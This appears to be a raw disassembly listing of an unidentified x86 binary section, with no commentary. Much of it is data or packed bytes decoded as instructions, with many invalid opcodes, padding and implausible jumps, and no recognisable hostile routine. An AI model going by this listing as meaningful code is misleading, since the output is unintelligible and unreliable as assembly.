  4087ab:	mov    ds:0x4f661eec,al
  4087b0:	iret   
  4087b1:	xchg   DWORD PTR [ebx],ebx
  4087b3:	sub    eax,0x77bf1d77
  4087b8:	xor    eax,0xf040a6d
  4087bd:	cmp    DWORD PTR [eax+0x50888e5b],ebx
  4087c3:	push   eax
  4087c4:	dec    edx
  4087c5:	not    BYTE PTR [eax+0x50]
  4087c8:	push   eax
	...
  4087d1:	add    BYTE PTR [edx+edi*1+0x33333375],ch
  4087d8:	xor    esi,DWORD PTR [ebx]
  4087da:	xor    esi,DWORD PTR [ebx]
  4087dc:	xor    esi,DWORD PTR [ebx]
  4087de:	mov    ecx,DWORD PTR [ebx-0x56173ef3]
  4087e4:	sbb    bl,dh
  4087e6:	xor    DWORD PTR [ecx+edi*8],0x4d
  4087ea:	fimul  DWORD PTR [ebx+0x156b3bde]
  4087f0:	pop    DWORD PTR [edi-0x722f5042]
  4087f6:	mov    dh,0xb5
  4087f8:	mov    ecx,DWORD PTR [ebx+0xcd2a31f]
  4087fe:	or     esi,eax
  408800:	push   esp
  408801:	dec    edx
  408802:	fistp  QWORD PTR [eax]
  408804:	out    dx,al
  408805:	sbb    dl,BYTE PTR [edx]
  408807:	aas    
  408808:	add    DWORD PTR [edx],esi
  40880a:	sbb    dl,BYTE PTR [ebx]
  40880c:	(bad)  
  40880d:	push   ebp
  40880e:	fimul  WORD PTR [edi]
  408810:	jne    0x4087e6
  408812:	iret   
  408813:	jo     0x40882b
  408815:	cmp    dl,BYTE PTR [eax-0x75]
  408818:	mov    esp,DWORD PTR [eax+edi*2]
  40881b:	out    dx,al
  40881c:	mov    ecx,DWORD PTR [ebx-0x74bb6036]
  408822:	add    BYTE PTR [ebx+edi*2-0x40],ah
  408826:	adc    eax,esp
  408828:	push   eax
  408829:	icebp  
  40882a:	push   ss
  40882b:	das    
  40882c:	repnz xchg ebp,eax
  40882e:	rol    DWORD PTR [esi+0x5b],cl
  408831:	leave  
  408832:	cmp    ah,ah
  408834:	aad    0xe
  408836:	jecxz  0x408814
  408838:	pop    edi
  408839:	lea    esi,[ecx-0x2d000000]
  40883f:	or     al,0x0
  408841:	add    BYTE PTR [ecx-0x80],ch
	...
  408850:	ins    DWORD PTR es:[edi],dx
  408851:	popa   
  408852:	cwde   
  408853:	jmp    0xa4a:0x2818b766
  40885a:	jp     0x408807
  40885c:	retf   0x259b
  40885f:	test   DWORD PTR [esi-0x2b],ebx
  408862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408863:	inc    edi
  408864:	stos   BYTE PTR es:[edi],al
  408865:	(bad)  
  408866:	repz and bh,bh
  408869:	(bad)  
  40886a:	(bad)  
  40886b:	(bad)  
  40886c:	(bad)  
  40886d:	(bad)  
  40886e:	(bad)  
  40886f:	(bad)  
  408870:	inc    DWORD PTR [eax]
  408872:	add    BYTE PTR [eax+0xd6c10a],bh
  408878:	add    BYTE PTR [ebp+0x4],al
  40887b:	(bad)  
  40887c:	jmp    0xc5c41d9a
  408881:	pushf  
  408882:	inc    eax
  408883:	jge    0x4088f3
  408885:	and    eax,0xb5285bb5
  40888a:	lods   eax,DWORD PTR ds:[esi]
  40888b:	call   0x984930aa
  408890:	cdq    
  408891:	div    DWORD PTR [ecx+ecx*4+0x558bf52b]
  408898:	daa    
  408899:	mov    edx,0x1bf1
  40889e:	push   edx
  40889f:	popa   
  4088a0:	add    BYTE PTR [eax],al
  4088a2:	or     ah,BYTE PTR [esi-0x52ffffdd]
  4088a8:	adc    eax,0xf18c70f7
  4088ad:	imul   ecx,DWORD PTR [ebx],0x2
  4088b0:	aam    0xa
  4088b2:	adc    dh,BYTE PTR [ebx-0x52]
  4088b5:	xor    eax,0xfaa77250
  4088ba:	mov    ebp,DWORD PTR [eax-0x4e]
  4088bd:	jge    0x40887d
  4088bf:	add    BYTE PTR [eax],al
  4088c1:	add    al,bl
  4088c3:	leave  
  4088c4:	bound  edx,QWORD PTR [edi-0x65]
  4088c7:	push   eax
  4088c8:	push   esi
  4088c9:	sbb    ebx,DWORD PTR ds:0x380991c4
  4088cf:	std    
  4088d0:	sub    DWORD PTR [esi+0x79b23071],esp
  4088d6:	pop    ebx
  4088d7:	add    esi,DWORD PTR [ebp+edx*2+0x5384cd61]
  4088de:	daa    
  4088df:	add    BYTE PTR [eax],al
  4088e1:	cmovb  eax,DWORD PTR [ebp+0x0]
  4088e5:	add    BYTE PTR [eax],al
  4088e7:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4088ed:	mov    ecx,DWORD PTR [ebx-0x3baccc75]
	...
  4088fb:	add    BYTE PTR [eax],al
  4088fd:	add    BYTE PTR [ebp+0x2e972f3d],bl
  408903:	dec    ebp
  408904:	lea    ecx,[ebx+0x36]
  408907:	push   edx
  408908:	dec    ebx
  408909:	cmp    ecx,ecx
  40890b:	dec    ebp
  40890c:	aaa    
  40890d:	loop   0x408934
  40890f:	push   eax
  408910:	xor    DWORD PTR [ebx+0x45],ecx
  408913:	into   
  408914:	shl    BYTE PTR [ebx+0x0],0x0
  408918:	push   eax
  408919:	add    BYTE PTR [bx+si],al
  40891c:	test   eax,0xa10000ac
  408921:	xchg   esi,eax
  408922:	stos   DWORD PTR es:[edi],eax
  408923:	xchg   BYTE PTR [edi+0x4e],al
  408926:	aam    0xb7
  408928:	out    0xd3,eax
  40892a:	pop    eax
  40892b:	cmp    eax,DWORD PTR [ebx-0x4b]
  40892e:	call   FWORD PTR [ebx]
  408930:	popf   
  408931:	mov    eax,0x824ba73
  408936:	xchg   esi,eax
  408937:	out    dx,al
  408938:	add    BYTE PTR [eax],al
  40893a:	dec    ebx
  40893b:	pop    esi
  40893c:	jg     0x40891b
  40893e:	add    BYTE PTR [eax],al
  408940:	add    BYTE PTR [ebx-0xfa258c0],cl
  408946:	loope  0x408902
  408948:	or     edi,DWORD PTR [edi-0x7ceffd6a]
  40894e:	sti    
  40894f:	cmp    eax,0x96a39b4a
  408954:	xor    ebx,DWORD PTR [ecx+0x6cc86cae]
  40895a:	sbb    BYTE PTR [ecx],dh
  40895c:	jb     0x408959
  40895e:	cwde   
  40895f:	xchg   ebx,eax
  408960:	xchg   edi,eax
  408961:	out    dx,eax
  408962:	push   esi
  408963:	and    eax,DWORD PTR [eax]
  408965:	add    cl,bh
  408967:	mov    edx,0xcc000000
  40896c:	int3   
  40896d:	int3   
  40896e:	int3   
  40896f:	int3   
  408970:	int3   
  408971:	int3   
  408972:	int3   
  408973:	int3   
  408974:	iret   
  408975:	arpl   WORD PTR [esi-0x7c7c7c7d],dx
  40897b:	add    DWORD PTR [ebx+0x4838383],0x4
  408982:	push   es
  408983:	fbld   TBYTE PTR [ebp-0x54fdce15]
  408989:	cmp    dl,bl
  40898b:	mov    ecx,esi
  40898d:	ret    0xdb5b
  408990:	loop   0x408a11
  408992:	pusha  
  408993:	xchg   DWORD PTR ds:0x739ca207,esp
  408999:	jmp    0x4d0c:0x8f510404
  4089a0:	lock cdq 
  4089a2:	das    
  4089a3:	mov    dl,0x10
  4089a5:	jne    0x408a22
  4089a7:	sbb    cl,0x2
  4089aa:	add    BYTE PTR [ecx-0x8],0xb6
  4089ae:	fadd   DWORD PTR [esi]
  4089b0:	jecxz  0x40895f
  4089b2:	pop    esi
  4089b3:	xor    eax,0xb1b3abfc
  4089b8:	data16 add al,0x4
  4089bb:	mov    ecx,0x404a768
  4089c0:	and    BYTE PTR [eax],bl
  4089c2:	aad    0x4
  4089c4:	add    BYTE PTR [edx+0x63742fdb],ch
  4089ca:	sbb    BYTE PTR [ebx-0x6443e959],bl
  4089d0:	outs   dx,DWORD PTR ds:[esi]
  4089d1:	fst    DWORD PTR [edx+0x5e69e818]
  4089d7:	mov    esi,0x9bbeb264
  4089dc:	int3   
  4089dd:	add    BYTE PTR [eax],al
  4089df:	add    BYTE PTR ds:0x4a0000f7,ah
  4089e5:	mov    edx,0x50000000
  4089ea:	push   eax
  4089eb:	push   eax
  4089ec:	push   eax
  4089ed:	push   eax
  4089ee:	push   eax
  4089ef:	push   eax
  4089f0:	push   eax
  4089f1:	push   eax
  4089f2:	xchg   sp,ax
  4089f4:	xchg   edi,ecx
  4089f6:	or     eax,0x3375dd8f
  4089fb:	cmp    esp,DWORD PTR [esi+0x40a4dd3f]
  408a01:	sbb    al,0x5f
  408a03:	push   esp
  408a04:	pop    es
  408a05:	pop    ecx
  408a06:	outs   dx,BYTE PTR ds:[esi]
  408a07:	retf   0xb7bc
  408a0a:	mov    ecx,DWORD PTR [ebx-0x74747475]
  408a10:	mov    ecx,DWORD PTR [ebx+0x656a6a8b]
  408a16:	repz (bad) 
  408a18:	scas   eax,DWORD PTR es:[edi]
  408a19:	push   0x6a
  408a1b:	ins    BYTE PTR es:[edi],dx
  408a1c:	mov    esi,0xb568e68f
  408a21:	int    0x4
  408a23:	add    eax,0x4b67fb41
  408a28:	and    al,0x1b
  408a2a:	inc    edi
  408a2b:	and    BYTE PTR [eax],ah
  408a2d:	je     0x408aa8
  408a2f:	cs jo  0x408a3c
  408a32:	jb     0x408aab
  408a34:	dec    ebp
  408a35:	cs and ah,BYTE PTR fs:[ecx+0x65]
  408a3a:	and    BYTE PTR [edx],cl
  408a3c:	imul   esp,DWORD PTR [edx+0x6d],0x2c723e53
  408a43:	ins    DWORD PTR es:[edi],dx
  408a44:	ins    DWORD PTR es:[edi],dx
  408a45:	bound  esp,QWORD PTR [edx+0x20]
  408a48:	and    ch,BYTE PTR [ecx+eiz*2+0x73]
  408a4c:	and    BYTE PTR [ebp+0x72],ah
  408a4f:	and    BYTE PTR [ebp+ebp*2+0x20],al
  408a53:	cs outs dx,DWORD PTR gs:[esi]
  408a56:	arpl   WORD PTR [edi+0x2f],bp
  408a59:	sub    DWORD PTR cs:0x726d7229,ecx
  408a60:	bound  ebp,QWORD PTR [eax]
  408a62:	addr16 dec ebp
  408a64:	gs cmp al,0x20
  408a67:	jo     0x408ad6
  408a69:	popa   
  408a6a:	gs ins DWORD PTR es:[edi],dx
  408a6c:	ins    DWORD PTR es:[edi],dx
  408a6d:	ins    DWORD PTR es:[edi],dx
  408a6e:	jae    0x408a7d
  408a70:	or     eax,0x6d737573
  408a75:	arpl   WORD PTR [ebx+0x72],dx
  408a78:	outs   dx,BYTE PTR ds:[esi]
  408a79:	jb     0x408aee
  408a7b:	outs   dx,BYTE PTR ds:[esi]
  408a7c:	and    eax,DWORD PTR ds:0x327705e1
  408a82:	(bad)  
  408a83:	fsubr  DWORD PTR [ecx-0x77]
  408a86:	sbb    eax,0x5286149
  408a8b:	xor    al,BYTE PTR [edx+0x50]
  408a8e:	out    0xe1,eax
  408a90:	push   0x6a
  408a92:	sub    al,0x9a
  408a94:	push   0x6a
  408a96:	shl    BYTE PTR [eax],0x78
  408a99:	push   0x0
  408a9b:	nop
  408a9c:	or     esp,DWORD PTR ds:0x8139668e
  408aa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aa3:	cwde   
  408aa4:	cmp    al,0x2d
  408aa6:	aas    
  408aa7:	xor    dl,BYTE PTR [ebp-0x5e]
  408aaa:	inc    eax
  408aab:	ss int 0xe9
  408aae:	push   ecx
  408aaf:	pushf  
  408ab0:	dec    ebp
  408ab1:	mov    eax,0xec
  408ab6:	ins    BYTE PTR es:[edi],dx
  408ab7:	sbb    BYTE PTR [ebx+0x3ce12558],ah
  408abd:	mov    eax,0x97d72b7a
  408ac2:	jb     0x408ad6
  408ac4:	fnstcw WORD PTR [edx-0x5d]
  408ac7:	or     eax,0x6a8d57f1
  408acc:	into   
  408acd:	xchg   BYTE PTR [ecx+0x16],dl
  408ad0:	push   eax
  408ad1:	sub    eax,0x8500007a
  408ad6:	lods   eax,DWORD PTR ds:[esi]
  408ad7:	and    eax,DWORD PTR [eax]
  408ad9:	add    BYTE PTR [eax],al
  408adb:	int3   
  408adc:	int3   
  408add:	int3   
  408ade:	int3   
  408adf:	int3   
  408ae0:	int3   
  408ae1:	int3   
  408ae2:	int3   
  408ae3:	int3   
  408ae4:	repz lahf 
  408ae6:	add    bh,bh
  408ae8:	(bad)  
  408ae9:	(bad)  
  408aea:	(bad)  
  408aeb:	(bad)  
  408aec:	(bad)  
  408aed:	(bad)  
  408aee:	(bad)  
  408aef:	jmp    FWORD PTR [edx+0x6a]
  408af2:	push   edx
  408af3:	inc    esp
  408af4:	xchg   edi,eax
  408af5:	pop    es
  408af6:	or     BYTE PTR [ebx+0x1cf9b863],cl
  408afc:	inc    esp
  408afd:	push   ebx
  408afe:	xchg   BYTE PTR [ebx+0x47],al
  408b01:	sbb    dl,bh
  408b03:	or     ch,dl
  408b05:	fwait
  408b06:	xor    eax,0x6acaf0d9
  408b0b:	push   0xfffffff8
  408b0d:	mov    esp,0x8ecf6a6a
  408b12:	push   0x6a
  408b14:	xor    al,0x9
  408b16:	lods   eax,DWORD PTR ds:[esi]
  408b17:	inc    edx
  408b18:	mov    ?,WORD PTR [eax+0x6be9fae2]
  408b1e:	int    0x97
  408b20:	and    BYTE PTR [ebx],0x32
  408b23:	push   esi
  408b24:	jns    0x408b32
  408b26:	ss popa 
  408b28:	call   0x6ac47229
  408b2d:	add    BYTE PTR [ebx+0x5beeb0],cl
  408b33:	add    BYTE PTR [eax],al
  408b35:	shl    BYTE PTR ds:0x39239284,0x74
  408b3c:	test   al,0xef
  408b3e:	aas    
  408b3f:	jno    0x408bb1
  408b41:	xchg   ebx,eax
  408b42:	jae    0x408b68
  408b44:	test   DWORD PTR [ecx+0x16],edx
  408b47:	mov    al,0x8b
  408b49:	push   esp
  408b4a:	into   
  408b4b:	push   esp
  408b4c:	test   esp,esp
  408b4e:	in     eax,dx
  408b4f:	push   0xaaecaa7b
  408b54:	test   BYTE PTR [ebx-0x30],bh
  408b57:	cmp    BYTE PTR [eax],al
  408b59:	add    BYTE PTR [ebx+0x46],bl
	...
  408b67:	add    bl,bh
  408b69:	ds xchg edi,eax
  408b6b:	add    al,0x4
  408b6d:	add    al,0x4
  408b6f:	add    al,0x4
  408b71:	add    al,0x4
  408b73:	add    al,0xff
  408b75:	jmp    DWORD PTR [edx-0x254f0977]
  408b7b:	es je  0x408b4f
  408b7e:	inc    eax
  408b7f:	push   ds
  408b80:	ds enter 0xea2d,0xb
  408b85:	shl    DWORD PTR [ebx-0x3d55742c],1
  408b8b:	push   esi
  408b8c:	dec    edi
  408b8d:	inc    ecx
  408b8e:	(bad)  
  408b8f:	push   edx
  408b91:	pop    edx
  408b92:	inc    eax
  408b93:	dec    esp
  408b94:	or     eax,0xacf853f
  408b99:	xchg   edx,eax
  408b9a:	and    eax,0x4801d4ab
  408b9f:	sub    DWORD PTR [edx+eiz*8+0x1c],eax
  408ba3:	xor    eax,0xce2affc0
  408ba8:	mov    bl,0xdb
  408baa:	lods   eax,DWORD PTR ds:[esi]
  408bab:	jmp    0x187a:0x5fffffc0
  408bb2:	(bad)  
  408bb3:	dec    ebx
  408bb5:	push   edx
  408bb6:	cmp    edi,0xc1a940f
  408bbc:	cmp    esp,DWORD PTR [edx-0x4f]
  408bbf:	and    DWORD PTR [edx+ebx*4-0x7ac2351a],esp
  408bc6:	pop    esp
  408bc7:	stc    
  408bc8:	jle    0x408c29
  408bca:	or     ch,ch
  408bcc:	mov    edi,0x47fa0166
  408bd1:	(bad)  
  408bd2:	(bad)  
  408bd3:	pcmpgtb mm4,QWORD PTR [ecx+0x52d20f0f]
  408bda:	(bad)  
  408bdb:	(bad)  
  408bdc:	sldt   WORD PTR [eax]
  408bdf:	add    BYTE PTR [eax],al
  408be1:	add    BYTE PTR [eax],al
  408be3:	add    BYTE PTR [eax],al
  408be5:	add    BYTE PTR [edi+0x3bb1379e],cl
  408beb:	jbe    0x408bbc
  408bed:	jle    0x408c5d
  408bef:	adc    eax,0xcc36b76b
  408bf5:	jge    0x408c67
  408bf7:	jns    0x408c54
  408bf9:	nop
  408bfa:	dec    esi
  408bfb:	pop    edi
  408bfc:	jno    0x408c7c
  408bfe:	lea    ecx,[ebp-0x72727273]
  408c04:	lea    ecx,[ebp+0x7600008d]
  408c0a:	stc    
  408c0b:	add    eax,DWORD PTR es:[eax]
  408c0e:	add    BYTE PTR [ebx],ah
  408c10:	sub    ah,BYTE PTR [edx-0x36597664]
  408c16:	dec    eax
  408c17:	mov    edx,0xced32642
  408c1c:	int3   
  408c1d:	lods   al,BYTE PTR ds:[esi]
  408c1e:	test   BYTE PTR [edx],ch
  408c20:	jg     0x408bdc
  408c22:	jp     0x408bd2
  408c24:	fsub   QWORD PTR ds:0x416d779e
  408c2a:	out    0xb,al
  408c2c:	jle    0x408c0d
  408c2e:	nop
  408c2f:	pop    eax
  408c30:	jg     0x408c98
  408c32:	add    BYTE PTR [eax],al
  408c34:	daa    
  408c35:	or     al,0x0
  408c37:	add    BYTE PTR [edi-0x60],bl
  408c3a:	pop    DWORD PTR [eax]
  408c3c:	mov    ecx,DWORD PTR [eiz*1-0x3a432930]
  408c43:	mov    eax,ds:0x413964a0
  408c48:	imul   ecx,DWORD PTR [ebp-0x4],0x34
  408c4c:	or     al,0xad
  408c4e:	add    ah,BYTE PTR [edi-0x73b101c4]
  408c54:	fimul  DWORD PTR [ebx-0xbd7475]
  408c5a:	add    eax,0xb63164
  408c5f:	and    edi,eax
  408c61:	lds    eax,FWORD PTR [ebx+0x71993f66]
  408c67:	sub    DWORD PTR [eax+0x15],ebx
  408c6a:	pop    ebp
  408c6b:	mov    cl,0x74
  408c6d:	sub    BYTE PTR [ebp+0xcb4a53],cl
  408c73:	mov    al,ds:0xd18b8ba6
  408c78:	sbb    edx,edx
  408c7a:	mov    ecx,DWORD PTR [ebx-0x75]
  408c80:	(bad)  
  408c81:	(bad)  
  408c82:	(bad)  
  408c83:	(bad)  
  408c84:	(bad)  
  408c85:	inc    ebp
  408c87:	push   cs
  408c88:	push   es
  408c89:	add    al,0x4
  408c8b:	add    al,0x4
  408c8d:	add    al,0x4
  408c8f:	add    al,0x4
  408c91:	add    al,0x6a
  408c93:	push   0x77
  408c95:	sti    
  408c96:	xlat   BYTE PTR ds:[ebx]
  408c97:	inc    edi
  408c98:	mov    WORD PTR [edi+ebp*8-0x6f],ss
  408c9c:	xchg   edi,eax
  408c9d:	std    
  408c9e:	lods   eax,DWORD PTR ds:[esi]
  408c9f:	adc    DWORD PTR [eax+0x46],eax
  408ca2:	mov    eax,ds:0x3c046929
  408ca7:	cmp    DWORD PTR [ebx+0x6a8d62a3],esp
  408cad:	push   0x36
  408caf:	jmp    0x408d1b
  408cb1:	push   0xffffff9a
  408cb3:	ss push 0x6a
  408cb6:	outs   dx,BYTE PTR ds:[esi]
  408cb7:	call   DWORD PTR [edx-0x71a85bcf]
  408cbd:	and    al,0xa2
  408cbf:	add    al,0x1b
  408cc1:	jecxz  0x408d1a
  408cc3:	aad    0xf7
  408cc5:	and    al,BYTE PTR [eax-0x21]
  408cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cc9:	and    BYTE PTR [edi],0x4c
  408ccc:	jb     0x408c9f
  408cce:	push   0xffffffff
  408cd0:	cmp    bh,BYTE PTR [ecx-0x56]
  408cd3:	out    dx,eax
  408cd4:	je     0x408d49
  408cd6:	inc    esp
  408cd7:	popa   
  408cd8:	arpl   WORD PTR [ebp+0x20],sp
  408cdb:	ins    DWORD PTR es:[edi],dx
  408cdc:	arpl   WORD PTR [edi+0x65],bp
  408cdf:	and    BYTE PTR [edx+0x20],dh
  408ce2:	outs   dx,DWORD PTR ds:[esi]
  408ce3:	gs je  0x408d55
  408ce6:	cmp    al,0x73
  408ce8:	imul   ebp,DWORD PTR [edi+0xd],0x72652873
  408cef:	jbe    0x408d35
  408cf1:	ins    DWORD PTR es:[edi],dx
  408cf2:	jb     0x408d58
  408cf4:	and    BYTE PTR [eax+0x2e],dh
  408cf7:	gs push edi
  408cf9:	gs or  eax,0x206e6273
  408cff:	ins    DWORD PTR es:[di],dx
  408d01:	gs jb  0x408d65
  408d04:	gs inc ecx
  408d06:	push   ebx
  408d07:	and    BYTE PTR gs:[eax+eiz*1+0x20],ah
  408d0c:	jo     0x408d0d
  408d0e:	(bad)  
  408d0f:	call   DWORD PTR [ecx-0x13385945]
  408d15:	outs   dx,BYTE PTR ds:[esi]
  408d16:	inc    ebp
  408d17:	mov    ecx,0x46d11f72
  408d1c:	push   esi
  408d1d:	mov    WORD PTR [esi+esi*2+0x2],es
  408d21:	inc    edx
  408d22:	xchg   DWORD PTR [edi-0x4d],ebx
  408d25:	enter  0x7739,0x3c
  408d29:	das    
  408d2a:	call   0x4ed5:0xc74d1229
  408d31:	xchg   esi,eax
  408d32:	xchg   edi,edi
  408d34:	inc    DWORD PTR [eax-0x57]
	...
  408d42:	add    BYTE PTR [ebx+0x60],bl
  408d45:	push   ebp
	...
  408d4e:	add    BYTE PTR [ebp+0x75],dh
  408d51:	push   0xa01ccc9e
  408d56:	scas   al,BYTE PTR es:[edi]
  408d57:	push   eax
  408d58:	jo     0x408d1a
  408d5a:	xor    cl,BYTE PTR [ebp-0x116902de]
  408d60:	cmc    
  408d61:	sbb    DWORD PTR [ecx-0x6c0de6a9],ebx
  408d67:	mov    al,0xa6
  408d69:	jne    0x408de0
  408d6b:	ins    DWORD PTR es:[edi],dx
  408d6c:	xor    ch,0x8f
  408d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d70:	into   
  408d71:	jne    0x408d01
  408d73:	ss and eax,edx
  408d76:	in     eax,0x79
  408d78:	out    dx,eax
  408d79:	iret   
  408d7a:	inc    esp
  408d7b:	xor    cl,BYTE PTR [ebp+0x5341f1f3]
  408d81:	jbe    0x408d87
  408d83:	inc    esi
  408d84:	jg     0x408d47
  408d86:	push   cs
  408d87:	lods   al,BYTE PTR ds:[esi]
  408d88:	jne    0x408dff
  408d8a:	clc    
  408d8b:	sbb    ah,BYTE PTR [eax-0x3d28a8b]
  408d91:	call   0xbe5b:0x8bab0075
  408d98:	arpl   WORD PTR [eax-0x3c],cx
  408d9b:	pop    ss
  408d9c:	cld    
  408d9d:	sub    DWORD PTR [ebx-0x60a39b74],edx
  408da3:	cmp    BYTE PTR [ebx+0x58],dl
  408da6:	mov    esp,0xa87a96ae
  408dab:	adc    eax,DWORD PTR [eax]
  408dad:	add    BYTE PTR [eax],al
  408daf:	cmp    esp,ebx
  408db1:	add    BYTE PTR [eax],al
  408db3:	sbb    dl,ch
  408db5:	add    BYTE PTR [eax],al
  408db7:	add    al,ch
  408db9:	call   0xe92976a6
  408dbe:	call   0x25b976ab
  408dc3:	cdq    
  408dc4:	jmp    0xa531:0x40959e6e
  408dcb:	int3   
  408dcc:	mov    WORD PTR [edx+0x3aa84e23],?
  408dd2:	sub    esi,esp
  408dd4:	push   ebp
  408dd5:	inc    BYTE PTR ds:0x8b8b157d
  408ddb:	mov    ecx,DWORD PTR [ebx-0x74747475]
  408de1:	mov    ebp,DWORD PTR [edx+0x6a]
  408de4:	dec    esp
  408de5:	and    al,bl
  408de7:	into   
  408de8:	push   0x6a
  408dea:	jle    0x408de7
  408dec:	and    eax,0xed079b69
  408df1:	adc    al,0xf9
  408df3:	jb     0x408dc2
  408df5:	rcr    DWORD PTR [ebp-0x5b],0xd9
  408df9:	ret    0xed68
  408dfc:	out    0xab,al
  408dfe:	mov    ds:0x5a8ee0c9,al
  408e03:	fldenv [ebp+0x3cddd43]
  408e09:	xchg   ecx,eax
  408e0a:	std    
  408e0b:	add    al,0xfe
  408e0d:	push   0x6a
  408e0f:	sub    ebx,esp
  408e11:	push   0x6a
  408e13:	out    0x33,al
  408e15:	ins    BYTE PTR es:[edi],dx
  408e16:	push   0x0
  408e18:	xchg   ebx,eax
  408e19:	retf   0xb4e7
  408e1c:	push   ss
  408e1d:	jecxz  0x408e6b
  408e1f:	ins    BYTE PTR es:[edi],dx
  408e20:	mov    edi,0xac56e1ab
  408e25:	jp     0x408e98
  408e27:	sbb    al,0x5f
  408e29:	aam    0x2c
  408e2b:	push   ebp
  408e2c:	cld    
  408e2d:	push   esp
  408e2e:	ss mov ecx,0xd5000000
  408e34:	pop    ecx
  408e35:	cli    
  408e36:	jle    0x408eab
  408e38:	outs   dx,DWORD PTR ds:[esi]
  408e39:	xlat   BYTE PTR ds:[ebx]
  408e3a:	test   eax,0x77fbd812
  408e3f:	out    0x95,al
  408e41:	pop    esp
  408e42:	hlt    
  408e43:	imul   eax,DWORD PTR [edx],0xc477558f
  408e49:	test   ch,ch
  408e4b:	sub    ch,BYTE PTR [ecx+0x83243f]
  408e51:	add    BYTE PTR [ecx+0x983e],ch
  408e57:	add    BYTE PTR [ebp+0x45],al
  408e5a:	inc    ebp
  408e5b:	inc    ebp
  408e5c:	inc    ebp
  408e5d:	inc    ebp
  408e5e:	inc    ebp
  408e5f:	inc    ebp
  408e60:	inc    ebp
  408e61:	repz fsubrp st(6),st
  408e64:	or     al,0xc
  408e66:	or     al,0xc
  408e68:	or     al,0xc
  408e6a:	or     al,0xc
  408e6c:	or     al,0xf
  408e6e:	pextrw esp,(bad),0xc5
  408e70:	bound  edx,QWORD PTR [ebx+edi*4+0x62]
  408e74:	jns    0x408e37
  408e76:	jmp    0x408e9f
  408e78:	mov    edi,0x2ef3c7cb
  408e7d:	(bad)  [ecx+0xf57568d]
  408e83:	mov    bl,0xfc
  408e85:	cmc    
  408e86:	xchg   ebx,eax
  408e87:	(bad)  
  408e88:	rdpmc  
  408e8a:	loopne 0x408e9b
  408e8c:	xadd   BYTE PTR [eax+0xf],bh
  408e90:	psllw  mm6,QWORD PTR [edi-0x16]
  408e94:	adc    eax,0xd3d8938c
  408e99:	cwde   
  408e9a:	ds aaa 
  408e9c:	cmp    dh,BYTE PTR [edi]
  408e9e:	push   esi
  408e9f:	loop   0x408e62
  408ea1:	fmul   DWORD PTR [eax+0x65]
  408ea4:	je     0x408f1c
  408ea6:	ds je  0x408ee3
  408ea9:	and    BYTE PTR [ebp+0x6d],ah
  408eac:	and    BYTE PTR [edi+0x3e],ch
  408eaf:	gs gs imul esp,DWORD PTR gs:[ebp+0x69],0x62202020
  408eb9:	and    BYTE PTR ds:0x65296565,cl
  408ebf:	and    BYTE PTR [ebx+0x74],ah
  408ec2:	and    ch,BYTE PTR [esi]
  408ec4:	arpl   WORD PTR [ebp+eiz*2+0x65],si
  408ec8:	and    BYTE PTR gs:[edi+eiz*2+0x65],dh
  408ecd:	imul   ebp,DWORD PTR [edi+0x50],0x69652e63
  408ed4:	and    BYTE PTR [eax],ah
  408ed6:	imul   ebp,DWORD PTR [ebp+0x6f],0xd745765
  408edd:	stc    
  408ede:	leave  
  408edf:	loop   0x408f43
  408ee1:	pop    ds
  408ee2:	inc    esp
  408ee3:	str    edi
  408ee6:	call   0x41283a
  408eeb:	add    BYTE PTR [edx-0x628cee29],ch
  408ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ef2:	(bad)  
  408ef3:	lock mov esi,0x57119592
  408ef9:	dec    ebx
  408efa:	fild   DWORD PTR [ebp-0x7e]
  408efd:	jmp    0x23dc:0xe794b94a
  408f04:	ror    BYTE PTR [edx+0xe],0xee
  408f08:	test   BYTE PTR [edi],bl
  408f0a:	push   ebp
  408f0b:	clc    
  408f0c:	loope  0x408f47
  408f0e:	iret   
  408f0f:	add    BYTE PTR [eax],al
  408f11:	lods   al,BYTE PTR ds:[esi]
  408f12:	aam    0x0
  408f14:	add    BYTE PTR [eax],al
  408f16:	int3   
  408f17:	int3   
  408f18:	int3   
  408f19:	int3   
  408f1a:	int3   
  408f1b:	int3   
  408f1c:	int3   
  408f1d:	int3   
  408f1e:	int3   
  408f1f:	pop    edx
  408f20:	into   
  408f21:	inc    edx
  408f22:	mov    ecx,DWORD PTR [ebx-0x74747475]
  408f28:	mov    ecx,DWORD PTR [ebx-0x4e000075]
  408f2e:	aaa    
  408f2f:	test   DWORD PTR [edi+0x59],ebp
  408f32:	scas   eax,DWORD PTR es:[edi]
  408f33:	sbb    ch,BYTE PTR [ebx-0x5493ce0a]
  408f39:	(bad)  
  408f3a:	pusha  
  408f3b:	and    dl,ch
  408f3d:	mov    BYTE PTR ds:0x5e1cf2fe,ch
  408f43:	pop    es
  408f44:	je     0x408f45
  408f46:	call   FWORD PTR [eax+ebx*8-0x7ef39650]
  408f4d:	pop    ebx
  408f4e:	jmp    0x408ed6
  408f50:	int    0x72
  408f52:	imul   ebp,DWORD PTR [ebx+ebx*4],0x7c
  408f56:	cmp    BYTE PTR [ebp+0x2f],bl
  408f59:	sbb    ch,BYTE PTR [esi-0x44351741]
  408f5f:	jnp    0x408f68
  408f61:	mov    eax,gs:0x8ffffcd
  408f67:	out    0xf0,al
  408f69:	(bad)  
  408f6a:	(bad)  
  408f6b:	jge    0x408f3e
  408f6d:	inc    ebp
  408f6e:	inc    DWORD PTR [eax]
  408f70:	pop    edi
  408f71:	mov    bl,BYTE PTR [esi+0x2d8ba12f]
  408f77:	mov    BYTE PTR [edi+ebp*8+0x15b2ac9a],ch
  408f7e:	sbb    al,BYTE PTR [ecx-0x33]
  408f81:	arpl   WORD PTR [ecx-0x21],bx
  408f84:	lea    esp,[ebp-0x66]
  408f87:	rol    DWORD PTR [eax],1
  408f89:	add    BYTE PTR [eax],al
  408f8b:	popa   
  408f8c:	data16 add BYTE PTR [eax],al
  408f8f:	xor    bh,bh
	...
  408f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f9e:	inc    eax
  408f9f:	cwde   
  408fa0:	sbb    ecx,0x8cebbc84
  408fa6:	scas   eax,DWORD PTR es:[edi]
  408fa7:	(bad)  
  408fa8:	test   eax,0x6295f1a6
  408fad:	mov    ebx,0x3d0a3b4f
  408fb2:	leave  
  408fb3:	jge    0x408f9f
